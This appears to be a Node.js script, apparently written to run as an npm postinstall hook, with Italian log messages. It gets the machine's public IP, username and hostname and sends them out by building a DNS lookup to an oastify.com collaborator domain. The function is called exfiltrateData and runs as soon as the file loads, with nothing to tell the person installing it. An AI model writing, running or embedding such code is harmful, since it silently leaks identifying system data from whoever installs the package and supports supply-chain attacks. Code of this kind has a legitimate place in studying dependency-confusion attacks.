
async function getPublicIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Errore nel recuperare IP pubblico:', error);
      return 'IP_not_found';
    }
  }
  

  async function exfiltrateData() {
    const publicIP = await getPublicIP();
    const os = require('os');
    const dns = require('dns');
  
    const hostname = os.hostname();
    const userId = os.userInfo().username;
  

    const exfilData = `postInstall-${publicIP}.user-${userId}.host-${hostname}.znqmvn1wwl8gvx2z2644qabg57byzpqdf.oastify.com`;
  

    dns.resolve(exfilData, 'A', (err) => {
      if (err) console.error('Errore nella risoluzione DNS per esfiltrazione:', err);
      else console.log('Richiesta DNS inviata per esfiltrazione dati:', exfilData);
    });
  }
  

  exfiltrateData();